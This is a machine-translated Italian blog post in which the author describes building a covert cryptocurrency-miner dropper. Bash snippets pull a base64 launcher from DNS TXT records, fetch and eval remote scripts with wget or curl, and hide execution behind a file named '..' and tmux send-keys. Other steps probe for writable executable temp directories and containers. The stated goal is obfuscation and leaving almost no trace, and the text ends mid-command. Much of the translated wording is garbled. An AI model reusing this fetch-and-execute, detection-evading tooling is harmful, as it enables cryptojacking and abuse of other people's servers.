<!doctypehtml><html lang=it><meta charset=UTF-8><meta content=width=device-width,initial-scale=1 name=viewport><link href=https://www.unto.re/it/posts/chronichles_of_a_cryptonote_dropper/ rel=canonical><link title="il sito di untoreh"href=https://www.unto.re/feed.xml rel=alternate type=application/rss+xml><link href=https://www.unto.re/amp/it/posts/chronichles_of_a_cryptonote_dropper/ rel=amphtml><script type=application/ld+json>{"copyrightHolder":"untoreh","@id":"https://www.unto.re","url":"https://www.unto.re","copyrightYear":2021,"@context":"https://schema.org/","image":"/assets/appa.png","@type":"WebSite"}</script><script type=application/ld+json>{"audience":"cool people","url":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"accessibilitySummary":"Visual elements are tentatively described.","description":"...How far are you willing to go for...pennies?","author":{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"email":"contact@unto.re","name":"untoreh","@type":"https://schema.org/Person","image":"/assets/appa.png"},"mentions":[],"@context":"https://schema.org","accessModeSufficient":{"itemListElement":["textual","visual"],"@type":"itemList"},"@type":"https://schema.org/WebPage","lastReviewed":"2021-08-21","dateCreated":"August 21, 2021","@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","dateModified":"2021-08-21","availableLanguage":[{"name":"English","@type":"Language"},{"name":"German","@type":"Language"},{"name":"Italian","@type":"Language"},{"name":"Mandarin Chinese","@type":"Language"},{"name":"Spanish","@type":"Language"},{"name":"Hindi","@type":"Language"},{"name":"Arabic","@type":"Language"},{"name":"Portuguese","@type":"Language"},{"name":"Bengali","@type":"Language"},{"name":"Russian","@type":"Language"},{"name":"Japanese","@type":"Language"},{"name":"Punjabi","@type":"Language"},{"name":"Javanese","@type":"Language"},{"name":"Vietnamese","@type":"Language"},{"name":"French","@type":"Language"},{"name":"Urdu","@type":"Language"},{"name":"Turkish","@type":"Language"},{"name":"Polish","@type":"Language"},{"name":"Ukranian","@type":"Language"},{"name":"Dutch","@type":"Language"},{"name":"Greek","@type":"Language"},{"name":"Swedish","@type":"Language"},{"name":"Zulu","@type":"Language"},{"name":"Romanian","@type":"Language"},{"name":"Malay","@type":"Language"},{"name":"Korean","@type":"Language"},{"name":"Thai","@type":"Language"},{"name":"Filipino","@type":"Language"}],"keywords":["crypto","net","shell"],"creativeWorkStatus":"Published","publisher":{"url":"https://www.unto.re","sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"contactPoint":{"contactType":"info","email":"contact@unto.re","@type":"ContactPoint","telephone":""},"logo":"/assets/appa.png","name":"untoreh's site","@type":"Organization"},"datePublished":"2021-08-21","inLanguage":"English","image":"/assets/appa.png","name":"","mainEntityOfPage":{"@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","@type":"Article"}}</script><script id=ldj-breadcrumbs type=application/ld+json>{"itemListElement":[{"position":1,"item":"https://www.unto.re","name":"Home","@type":"ListItem"},{"position":2,"item":"/posts/","name":"Posts List","@type":"ListItem"},{"position":3,"item":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper","name":"Chronicles of a cryptonote dropper","@type":"ListItem"}],"@type":"BreadcrumbList"}</script><link href=/libs/highlight/github.min.css rel=stylesheet><link href=/css/franklin.css rel=stylesheet><link href=/css/main.css rel=stylesheet><link href=/css/menu.css rel=stylesheet><link href=/css/pages.css rel=stylesheet><link href=/css/lunr.css rel=stylesheet><link href=/css/footer.css rel=stylesheet><link href=/css/responsive.css rel=stylesheet><link href=/css/animations.css rel=stylesheet><link href=/css/docco.css rel=stylesheet><link href=/css/flags-sprite.css rel=stylesheet><link href=/assets/favicon.png rel=icon type=image/x-icon><link href=/assets/favicon.svg rel=icon type=image/svg+xml><title> Cronache di un contagocce di criptonote</title><meta content="...How far are you willing to go for...pennies?"name=description><script src=/libs/load.js></script><script type=application/ld+json>{"url":"/it/posts/chronichles_of_a_cryptonote_dropper/","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"mentions":null,"description":"","@context":"https://schema.org","accessModeSufficient":{"itemListElement":["textual","visual"],"@type":"itemList"},"@type":"https://schema.org/WebPage","lastReviewed":"","dateCreated":"","@id":"/it/posts/chronichles_of_a_cryptonote_dropper/","dateModified":"","keywords":[],"creativeWorkStatus":"Published","translator":{"url":"http://google.translate.com","name":"Google Translate","@type":"https://schema.org/Organization"},"translationOfWork":{"@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/"},"datePublished":"2021-10-21T18:53:47.630","inLanguage":"it","name":"","mainEntityOfPage":{"@id":"/it/posts/chronichles_of_a_cryptonote_dropper/","@type":"Article"}}</script><body><div class=masthead><div class=masthead__inner-wrap><div class=masthead__menu><a class=site-title href=/it/></a><div class=author__wrap><script type=application/ld+json>{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"email":"contact@unto.re","name":"untoreh","@type":"https://schema.org/Person","image":"/assets/appa.png"}</script><ul><li class=author__avatar onclick=toggleTheme()><img alt=" untoreh-luce"class=flip-front src=/assets/appa.png><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"href=https://twitter.com/untoreh><i class="fab fa-fw fa-twitter-square"aria-hidden=true></i></a><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"href=https://github.com/untoreh><i class="fab fa-fw fa-github"aria-hidden=true></i></a><li class="author__urls social-icons"><a href=mailto:contact@unto.re><i class="fas fa-envelope"></i></a><li><script type=application/ld+json>{"potentialAction":{"query-input":"required maxlength=100 name=input","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":{"uri":"","scheme":"https","userinfo":"","host":"www.unto.re","port":"","path":"/search","query":"q=%7Binput%7D","fragment":""}}}</script></ul></div><nav id=site-nav><div class=horiz><ul><li class="masthead__menu-item hvr-outline-in"id=lunrSearch><form id=lunrSearchForm name=lunrSearchForm><button name="Search Website"class=search-button formaction=/search/index.html value=Search><i class="fas fa-search menu-icons"></i></button><input class=search-input name=q placeholder=Search…></form><li class="masthead__menu-item hvr-outline-in"><a title="All the articles that I have written"href=/it/posts/><i class="fas fa-pen menu-icons"></i> post</a><li class="masthead__menu-item hvr-outline-in"><a title="Video and audio content from streaming websites."href=/it/media/><i class="fas fa-tv menu-icons"></i> media</a><li class="masthead__menu-item hvr-outline-in menu-lang-btn"title="Change website's language"><button name="Languages Menu"class=langs-dropdown-wrapper><i class="fas fa-language menu-icons"></i> Lang <div class=langs-dropdown-content id=langs-dropdown-menu><ul id=lang-list><a class=lang-link href=/ar/posts/chronichles_of_a_cryptonote_dropper id=lang-ar><span class="flag flag-sa"></span>Arabic</a><a class=lang-link href=/bn/posts/chronichles_of_a_cryptonote_dropper id=lang-bn><span class="flag flag-bd"></span>Bengali</a><a class=lang-link href=/nl/posts/chronichles_of_a_cryptonote_dropper id=lang-nl><span class="flag flag-nl"></span>Dutch</a><a class=lang-link href=/posts/chronichles_of_a_cryptonote_dropper id=lang-en><span class="flag flag-gb"></span>English</a><a class=lang-link href=/tl/posts/chronichles_of_a_cryptonote_dropper id=lang-tl><span class="flag flag-ph"></span>Filipino</a><a class=lang-link href=/fr/posts/chronichles_of_a_cryptonote_dropper id=lang-fr><span class="flag flag-fr"></span>French</a><a class=lang-link href=/de/posts/chronichles_of_a_cryptonote_dropper id=lang-de><span class="flag flag-de"></span>German</a><a class=lang-link href=/el/posts/chronichles_of_a_cryptonote_dropper id=lang-el><span class="flag flag-gr"></span>Greek</a><a class=lang-link href=/hi/posts/chronichles_of_a_cryptonote_dropper id=lang-hi><span class="flag flag-in"></span>Hindi</a><a class=lang-link href=/it/posts/chronichles_of_a_cryptonote_dropper id=lang-it><span class="flag flag-it"></span>Italian</a><a class=lang-link href=/ja/posts/chronichles_of_a_cryptonote_dropper id=lang-ja><span class="flag flag-jp"></span>Japanese</a><a class=lang-link href=/jw/posts/chronichles_of_a_cryptonote_dropper id=lang-jw><span class="flag flag-id"></span>Javanese</a><a class=lang-link href=/ko/posts/chronichles_of_a_cryptonote_dropper id=lang-ko><span class="flag flag-kr"></span>Korean</a><a class=lang-link href=/ms/posts/chronichles_of_a_cryptonote_dropper id=lang-ms><span class="flag flag-ms"></span>Malay</a><a class=lang-link href=/zh/posts/chronichles_of_a_cryptonote_dropper id=lang-zh><span class="flag flag-cn"></span>Mandarin Chinese</a><a class=lang-link href=/pl/posts/chronichles_of_a_cryptonote_dropper id=lang-pl><span class="flag flag-pl"></span>Polish</a><a class=lang-link href=/pt/posts/chronichles_of_a_cryptonote_dropper id=lang-pt><span class="flag flag-pt"></span>Portuguese</a><a class=lang-link href=/pa/posts/chronichles_of_a_cryptonote_dropper id=lang-pa><span class="flag flag-in"></span>Punjabi</a><a class=lang-link href=/ro/posts/chronichles_of_a_cryptonote_dropper id=lang-ro><span class="flag flag-ro"></span>Romanian</a><a class=lang-link href=/ru/posts/chronichles_of_a_cryptonote_dropper id=lang-ru><span class="flag flag-ru"></span>Russian</a><a class=lang-link href=/es/posts/chronichles_of_a_cryptonote_dropper id=lang-es><span class="flag flag-es"></span>Spanish</a><a class=lang-link href=/sv/posts/chronichles_of_a_cryptonote_dropper id=lang-sv><span class="flag flag-se"></span>Swedish</a><a class=lang-link href=/th/posts/chronichles_of_a_cryptonote_dropper id=lang-th><span class="flag flag-th"></span>Thai</a><a class=lang-link href=/tr/posts/chronichles_of_a_cryptonote_dropper id=lang-tr><span class="flag flag-tr"></span>Turkish</a><a class=lang-link href=/uk/posts/chronichles_of_a_cryptonote_dropper id=lang-uk><span class="flag flag-ua"></span>Ukranian</a><a class=lang-link href=/ur/posts/chronichles_of_a_cryptonote_dropper id=lang-ur><span class="flag flag-pk"></span>Urdu</a><a class=lang-link href=/vi/posts/chronichles_of_a_cryptonote_dropper id=lang-vi><span class="flag flag-vn"></span>Vietnamese</a><a class=lang-link href=/zu/posts/chronichles_of_a_cryptonote_dropper id=lang-zu><span class="flag flag-za"></span>Zulu</a></ul></div></button></ul></div><button name="Website Menu"class=ham><i class="fas fa-bars ham-icon"></i></button><div class=vert><ul><li class="masthead__menu-item hvr-outline-in"id=lunrSearch><form id=lunrSearchForm name=lunrSearchForm><button name="Search Website"class=search-button formaction=/search/index.html value=Search><i class="fas fa-search menu-icons"></i></button><input class=search-input name=q placeholder=Search…></form><li class="masthead__menu-item hvr-outline-in"><a title="All the articles that I have written"href=/it/posts/><i class="fas fa-pen menu-icons"></i> post</a><li class="masthead__menu-item hvr-outline-in"><a title="Video and audio content from streaming websites."href=/it/media/><i class="fas fa-tv menu-icons"></i> media</a><li class="masthead__menu-item hvr-outline-in menu-lang-btn"title="Change website's language"><button name="Languages Menu"class=langs-dropdown-wrapper><i class="fas fa-language menu-icons"></i> Lang <div class=langs-dropdown-content id=langs-dropdown-menu><ul id=lang-list><a class=lang-link href=/ar/posts/chronichles_of_a_cryptonote_dropper id=lang-ar><span class="flag flag-sa"></span>Arabic</a><a class=lang-link href=/bn/posts/chronichles_of_a_cryptonote_dropper id=lang-bn><span class="flag flag-bd"></span>Bengali</a><a class=lang-link href=/nl/posts/chronichles_of_a_cryptonote_dropper id=lang-nl><span class="flag flag-nl"></span>Dutch</a><a class=lang-link href=/posts/chronichles_of_a_cryptonote_dropper id=lang-en><span class="flag flag-gb"></span>English</a><a class=lang-link href=/tl/posts/chronichles_of_a_cryptonote_dropper id=lang-tl><span class="flag flag-ph"></span>Filipino</a><a class=lang-link href=/fr/posts/chronichles_of_a_cryptonote_dropper id=lang-fr><span class="flag flag-fr"></span>French</a><a class=lang-link href=/de/posts/chronichles_of_a_cryptonote_dropper id=lang-de><span class="flag flag-de"></span>German</a><a class=lang-link href=/el/posts/chronichles_of_a_cryptonote_dropper id=lang-el><span class="flag flag-gr"></span>Greek</a><a class=lang-link href=/hi/posts/chronichles_of_a_cryptonote_dropper id=lang-hi><span class="flag flag-in"></span>Hindi</a><a class=lang-link href=/it/posts/chronichles_of_a_cryptonote_dropper id=lang-it><span class="flag flag-it"></span>Italian</a><a class=lang-link href=/ja/posts/chronichles_of_a_cryptonote_dropper id=lang-ja><span class="flag flag-jp"></span>Japanese</a><a class=lang-link href=/jw/posts/chronichles_of_a_cryptonote_dropper id=lang-jw><span class="flag flag-id"></span>Javanese</a><a class=lang-link href=/ko/posts/chronichles_of_a_cryptonote_dropper id=lang-ko><span class="flag flag-kr"></span>Korean</a><a class=lang-link href=/ms/posts/chronichles_of_a_cryptonote_dropper id=lang-ms><span class="flag flag-ms"></span>Malay</a><a class=lang-link href=/zh/posts/chronichles_of_a_cryptonote_dropper id=lang-zh><span class="flag flag-cn"></span>Mandarin Chinese</a><a class=lang-link href=/pl/posts/chronichles_of_a_cryptonote_dropper id=lang-pl><span class="flag flag-pl"></span>Polish</a><a class=lang-link href=/pt/posts/chronichles_of_a_cryptonote_dropper id=lang-pt><span class="flag flag-pt"></span>Portuguese</a><a class=lang-link href=/pa/posts/chronichles_of_a_cryptonote_dropper id=lang-pa><span class="flag flag-in"></span>Punjabi</a><a class=lang-link href=/ro/posts/chronichles_of_a_cryptonote_dropper id=lang-ro><span class="flag flag-ro"></span>Romanian</a><a class=lang-link href=/ru/posts/chronichles_of_a_cryptonote_dropper id=lang-ru><span class="flag flag-ru"></span>Russian</a><a class=lang-link href=/es/posts/chronichles_of_a_cryptonote_dropper id=lang-es><span class="flag flag-es"></span>Spanish</a><a class=lang-link href=/sv/posts/chronichles_of_a_cryptonote_dropper id=lang-sv><span class="flag flag-se"></span>Swedish</a><a class=lang-link href=/th/posts/chronichles_of_a_cryptonote_dropper id=lang-th><span class="flag flag-th"></span>Thai</a><a class=lang-link href=/tr/posts/chronichles_of_a_cryptonote_dropper id=lang-tr><span class="flag flag-tr"></span>Turkish</a><a class=lang-link href=/uk/posts/chronichles_of_a_cryptonote_dropper id=lang-uk><span class="flag flag-ua"></span>Ukranian</a><a class=lang-link href=/ur/posts/chronichles_of_a_cryptonote_dropper id=lang-ur><span class="flag flag-pk"></span>Urdu</a><a class=lang-link href=/vi/posts/chronichles_of_a_cryptonote_dropper id=lang-vi><span class="flag flag-vn"></span>Vietnamese</a><a class=lang-link href=/zu/posts/chronichles_of_a_cryptonote_dropper id=lang-zu><span class="flag flag-za"></span>Zulu</a></ul></div></button></ul></div></nav></div></div></div><div><h1 id=title><a href=/it/posts/chronichles_of_a_cryptonote_dropper> Cronache di un contagocce di criptonote</a></h1><blockquote id=page-description style=font-style:italic>...Quanto lontano sei disposto a spingerti per... centesimi?</blockquote></div><div class=franklin-content><p>Supponi che tu voglia il mio<a href=https://en.wikipedia.org/wiki/Cryptocurrency> criptovalute</a> sul telecomando<em> virtuale</em> hardware. Devi trovare qualcosa per il mio. Server remoti significa, no<a href=https://en.wikipedia.org/wiki/Application-specific_integrated_circuit> ASICS</a> o algoritmi GPU proof of work, praticamente solo<a href=\posts/a-few-notes-on-proof-of-work> Monete compatibili con la CPU</a>.<h2 id=the_software><a class=header-anchor href=#the_software> Il software</a></h2><p>Cerca e trova un<a href=https://github.com/xmrig/xmrig> minatore</a> , ma non è proprio carino, vorresti qualcosa che puoi controllare meglio da remoto, così trovi<a href=https://github.com/Bendr0id/xmrigCC> un altro minatore</a> . Vuoi anche un<a href=https://github.com/Bendr0id/xmrigcc-proxy> proxy</a> , perché molte connessioni saranno di breve durata, non vuoi<a href=https://en.wikipedia.org/wiki/Denial-of-service_attack> dos</a> la tua piscina mineraria. Anche un<a href=https://github.com/search?q=tunnel> tunnel</a> sarebbe bello.<h2 id=the_design><a class=header-anchor href=#the_design> Il design</a></h2><p>Alcune botnet utilizzano i dati blockchain per cercare comandi,<a href=https://twitter.com/sarahjamielewis> qualcuno</a> sembra anche avere<a href=https://web.archive.org/web/https://twitter.com/SarahJamieLewis/status/1185724467776851968> scommesse perse</a> su questo non accadrà di nuovo ... comunque non siamo così sofisticati, ce la caveremo con alcuni record DNS che memorizzano uno script che estrae il payload che viene eseguito e lasciato autoestraendo in una directory temporanea<em> quasi</em> nessuna traccia della sua messa a punto. Ecco un piccolo diagramma di flusso che descrive la struttura</p><img src=/assets/posts/output/payload.png><h2 id=launcher><a class=header-anchor href=#launcher> lanciatore</a></h2><p>Il punto di uno script di avvio deve essere accessibile e facilmente aggiornabile in modo tale da resistere alla prova del tempo. In aggiornamento<a href=https://en.wikipedia.org/wiki/Domain_Name_System> DNS</a>record è facile e il DNS è l'ultima cosa che viene spenta all'interno di una rete, perché gli indirizzi IP sono difficili da ricordare, quindi è probabile che sarà disponibile la maggior parte delle volte. Vedi quando siamo<em> recupero dello script di distribuzione</em> in realtà stiamo già eseguendo una logica, questo è lo script di avvio, ha bisogno della capacità di eseguire query DNS per cercare i nostri record, il DNS potrebbe essere onnipresente ma<a href=https://web.archive.org/web/20201107155737/https://downloads.isc.org/isc/bind9/> scavare</a> non è.<p>C'è un piccolo enigma qui, se dobbiamo scaricare un altro strumento<em> per scaricare un altro script per scaricare il payload</em> dovremmo solo scaricare il payload! In difesa... fare questa danza scripty aggiunge all'offuscamento, permette di mantenere una sola implementazione del launcher (manutenzione, yay), non è richiesta la maggior parte delle volte... quindi forniamo anche un servizio di<a href=https://en.wikipedia.org/wiki/Standalone_program> collegato staticamente</a> dig eseguibile per eseguire query DNS, recuperato da self hosting o cloud hosting (sì, ci sono fallback, come 3 o 4, perché i servizi cloud hanno una larghezza di banda libera minima e richiedono anche cookie o token di accesso ... sono molto script scortese, volutamente così, ovviamente).<p>Cosa c'è nei record DNS? stiamo usando<a href=https://en.wikipedia.org/wiki/TXT_record> testo</a> record, su un dominio personalizzato (fallback anche qui). Perché TXT? capita che siano quelli che possono memorizzare la più grande quantità di dati..di solito perché è una specie di<a href=https://www.ietf.org/rfc/rfc6763.txt> consigliato</a> a seconda di<em> cose</em> . Stiamo specificamente utilizzando<a href=https://www.cloudflare.com/> cloudflare</a> per il nostro smanettare DNS poiché è gratuito e praticamente l'unico giocatore in città (<em> beh, non proprio, ma qualsiasi altra alternativa impallidisce in termini di caratteristiche</em> ). Succede che puoi memorizzare più dati sul<em> stesso</em>record... questo inizia a diventare confuso e a cercare alcune specifiche... (tangente) Cloudflare<a href=https://web.archive.org/save/https://community.cloudflare.com/t/was-there-a-reduction-in-maximum-txt-size> abituato a</a> permettere<em> incatenato</em> I record TXT per un totale di ~9k byte, i documenti ora indicano ~2k byte, prima della modifica stavo usando ~6k credo, e stavo servendo lo script non compresso, dopodiché ho dovuto assottigliare lo script e comprimerlo prima (in realtà io provato a usare un<a href=https://freedns.afraid.org/> libertà</a> provider, sono stato bannato entro un giorno, supponendo che abbiano una rigorosa politica per i record TXT senza grassi), tuttavia la compressione gzip sembra NON essere compatibile con le pipe e stava ancora causando problemi, quindi ho dovuto riuscire a stipare lo script senza compressione ( tangente finale).<p>Come lo conserviamo? I record TXT supportano solo stringhe alfanumeriche, no<a href=https://en.wikipedia.org/wiki/Null_character> NUL</a> , quindi dobbiamo avvolgerlo in una codifica non nulla,<a href=https://en.wikipedia.org/wiki/Base64> base64</a> soddisfa questo vincolo, e poiché stiamo memorizzando<em> incatenato</em> TXT record, dobbiamo dividere l'output, poiché stiamo usando roba di shell, questo viene fatto attraverso il<code>-w</code> flag, su busybox tale flag era assente (o opt-in) su versioni precedenti il ​​che era fastidioso, un'alternativa è usare l'encoder in bundle con openssl,<code>openssl enc -base64</code>.<p>Ora che sappiamo come archiviare il nostro script di distribuzione, lo memorizziamo con entrambi<a href=https://web.archive.org/web/20210305071742/https://github.com/cloudflare/cloudflare-go/blob/master/cmd/flarectl/README.md> cfr cli</a> o manualmente. Come lo tiriamo? Abbiamo detto che abbiamo bisogno di bindutils o del nostro<code>dig</code> ...dopo aver scelto l'endpoint di servizio, vogliamo scaricarlo, ciò che è disponibile di solito è<a href=https://www.gnu.org/software/wget/> wget</a> o<a href=https://curl.se/> arricciare</a> , wget si trova preinstallato molto più spesso, tuttavia busybox fornisce solo supporto tls con librerie dinamiche, quindi devi assicurarti che l'endpoint stia servendo http o che la tua utility sia<code>wget</code> da gnu-utils<pre><code class="bash hljs"><span class=hljs-comment># the wget command</span>
wget -t 2 -T 10 -q -i- -O- > <span class=hljs-variable>$filename</span> <<< <span class=hljs-string>"<span class=hljs-variable>$digurl</span>"</span></code></pre><p>significa provare<code>-t2</code>tempi di attesa<code>-T10</code> secondi essendo<code>-q</code> lettura tranquilla da<code>-i-</code> standard (<code>$digurl</code> ) e scrivendo a<code>-O-</code> stabile (<code>$filename</code> ). Questo comando non rivela ciò che stiamo scaricando a prima vista. Faremo molta attenzione con altri comandi di shell per lo stesso motivo, o resteremo con shell (<a href=https://en.wikipedia.org/wiki/Bash_%28Unix_shell%29> bash</a> ) integrati ove possibile. Fai anche attenzione a dove stai scaricando i tuoi eseguibili, vuoi assicurarti di poterli eseguire, poiché alcuni punti di montaggio, specialmente in contenitori e<code>tmp</code> i percorsi sono<code>noexec</code> . Ora che abbiamo il nostro strumento di query DNS, recuperiamo i nostri record<pre><code class="bash hljs">dig txt <span class=hljs-variable>${record}</span>.<span class=hljs-variable>${zone}</span> +short +tcp +timeout=3 +retries=0 <span class=hljs-variable>$dnsserver</span></code></pre><p>Le bandiere sono autoesplicative qui,<code>+short</code> significa solo che siamo interessati solo ai dati stessi, in modo da non dover analizzare l'output. È importante specificare il server DNS, come google (<code>8.8.8.8</code> ) o cloudflare (<code>1.1.1.1</code> ) perché molti ambienti reindirizzano o proxy query DNS ai propri server DNS per impostazione predefinita. Dopo aver scaricato lo script in blocchi, ci occupiamo di virgolette e spazi bianchi per renderlo pronto per la decodifica<pre><code class="bash hljs">data=<span class=hljs-variable>${data//\"}</span><span class=hljs-comment># remove quotes</span>
data=<span class=hljs-variable>${data// }</span><span class=hljs-comment># remove whitespace</span><span class=hljs-built_in>declare</span> -a ar_data
<span class=hljs-keyword>for</span> l <span class=hljs-keyword>in</span><span class=hljs-variable>$data</span>; <span class=hljs-keyword>do</span>
    ar_data[<span class=hljs-variable>${l:0:1}</span>]=<span class=hljs-variable>${l:1}</span><span class=hljs-comment># iterate over each line and remove the first characther</span><span class=hljs-keyword>done</span>
data=<span class=hljs-variable>${ar_data[@]}</span><span class=hljs-comment># join all the lines</span>
data=<span class=hljs-variable>${data// }</span><span class=hljs-comment># ensure joining didn't add whitespace</span><span class=hljs-comment># decode</span>
launcher=$(<span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span> | <span class=hljs-variable>$b64</span> -d -w <span class=hljs-variable>$chunksize</span>)</code></pre><p>E se ora noi?<em> ancora</em> non hai il nostro launcher? Il DNS è disordinato, vogliamo un fallback, consente di impostare un sottodominio per recuperare direttamente lo script di avvio. Prima di valutare il nostro script vogliamo personalizzarlo, con alcune variabili, utilizziamo nuovamente un record TXT per memorizzare un elenco di variabili NAME=VALUE e analizzarlo. C'è anche un fallback per le variabili, cloudflare offre reindirizzamenti basati su URL, questi reindirizzamenti sono serviti<em> prima</em>la destinazione, quindi non abbiamo bisogno di un endpoint, vogliamo solo configurare regole di reindirizzamento basate su espressioni regolari a un endpoint fittizio, ciò che ci interessa sono i parametri dell'url<code>?NAME=VALUE&NAME2=VALUE2...</code> , in modo da poter parametrizzare il nostro launcher semplicemente cambiando l'url di reindirizzamento, sempre con attenzione alle virgolette e ai codici di escape<pre><code class="bash hljs"><span class=hljs-comment>## m1 also important to stop wget</span>
pl_vars=$(<span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$token_url</span>"</span> | wget -t 1 -T 3 -q -i- -S 2>&1 | grep -m1 <span class=hljs-string>'Location'</span>)
pl_vars=<span class=hljs-variable>${pl_vars#*\/}</span>
pl_vars=<span class=hljs-variable>${pl_vars//\"&/\" }</span>
pl_vars=<span class=hljs-variable>${pl_vars//%3F/\?}</span></code></pre><p>il wget<code>-S</code> stampa l'URL di reindirizzamento che ci interessa per l'analisi. Avendo i parametri e lo script, valutiamo le variabili scrivendole su un file<pre><code class="bash hljs"><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-variable>$pl_vars</span>"</span><span class=hljs-built_in>echo</span><span class=hljs-string>"export \
<span class=hljs-variable>$pl_vars</span> \
<span class=hljs-variable>$ENV_VARS</span> \
"</span>>env.sh</code></pre><p>Questo file sarà originato da are deploy script. L'ultima parte dello script di avvio è quella di effettivo<a href=https://en.wikipedia.org/wiki/Trampoline_(computing)> trampolino</a> , valuta lo script all'interno del processo di shell corrente, o magari lascia che sia gestito da tmux, se possibile.<pre><code class="bash hljs"><span class=hljs-comment># printf preserves quotes</span><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span>)</span>"</span> &>/dev/null
<span class=hljs-comment># or tmux</span><span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span> > <span class=hljs-string>".. "</span>
tmux send-keys -t miner <span class=hljs-string>". ./\".. \""</span> Enter</code></pre><p>Lo script di avvio viene scaricato in un file denominato ".." questo sembra confuso perché può essere scambiato per un<em> genitore</em> directory. E non includiamo il comando session, poiché ciò rimarrebbe nel comando process, invece avviamo la sessione tmux in anticipo e inviamo il comando source tramite l'interfaccia del terminale tmux. In relazione a questo, a volte chiamando un eseguibile con<code>./</code> mantiene quei caratteri nel comando, quindi è meglio aggiungere il<code>$PWD</code> al sentiero..<code>PATH=$PWD:$PATH</code>.<h2 id=the_payload><a class=header-anchor href=#the_payload> Il carico utile</a></h2><p>Il nostro script di distribuzione inizia con l'approvvigionamento del<code>env.sh</code> file e mantenendo o configurando vars come<code>STARTING_*</code> vars like<pre><code class="bash hljs">STARTING_PATH=<span class=hljs-variable>${STARTING_PATH:-<span class=hljs-variable>$PATH</span>}</span>
STARTING_PID=<span class=hljs-variable>$BASHPID</span></code></pre><p>Questo ci consente di terminare e riavviare un'istanza in esecuzione durante il ripristino dell'ambiente. Passiamo a una directory tmp con funzionalità exec<pre><code class="bash hljs"><span class=hljs-comment># out local subdirectory</span>
pathname=$(<span class=hljs-built_in>printf</span><span class=hljs-string>".%-<span class=hljs-subst>$((RANDOM%9+1)</span>)s"</span><span class=hljs-keyword>for</span> ph <span class=hljs-keyword>in</span> {/tmp,/dev/shm,/run,/var/tmp,/var/cache,~/.<span class=hljs-built_in>local</span>,~/.cache,~/}; <span class=hljs-keyword>do</span>
    rm -rf <span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        mkdir -p <span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        tmppath=<span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        is_path_executable <span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span> &&
        <span class=hljs-built_in>export</span> PATH=<span class=hljs-string>"<span class=hljs-variable>${ph}</span>/<span class=hljs-variable>$pathname</span>:<span class=hljs-variable>${PATH}</span>"</span> tmppath &&
        <span class=hljs-built_in>break</span><span class=hljs-keyword>done</span>
[ -n <span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span> ] && <span class=hljs-built_in>cd</span><span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span></code></pre><p>Verifica se entro a<a href=https://en.wikipedia.org/wiki/OS-level_virtualization> contenitore</a> è anche utile, possiamo sondare il filesystem per suggerimenti<pre><code class="bash hljs">c=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/etc/cpa*'</span>)
d=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/dev/*'</span>)
s=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/sys/*'</span>)
p=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/proc/*'</span>)
jail=
<span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$c</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$d</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$s</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$p</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-comment>## we are in a jail</span>
    jail=1
<span class=hljs-keyword>fi</span></code></pre><p>Ora è il momento di scaricare il nostro payload, scegliamo di supportare sia wget che curl, sappiamo già come usare wget con flag attenti, per curl è un po' diverso. Dobbiamo creare un file di configurazione e sovrascrivere<code>CURL_HOME</code><pre><code class="bash hljs"><span class=hljs-built_in>echo</span><span class=hljs-string>"url = <span class=hljs-variable>$uri</span>
output = <span class=hljs-variable>${name}</span><span class=hljs-variable>${format}</span>
connect-timeout = 10
"</span> > .curlrc
CURL_HOME=<span class=hljs-variable>$PWD</span> curl -sOL</code></pre><p>L'ultimo passaggio è solo quello di estrarre il payload<pre><code class="bash hljs"><span class=hljs-built_in>type</span> unzip &>/dev/null &&
    format=<span class=hljs-string>".zip"</span> extract=<span class=hljs-string>"unzip -q"</span> ||
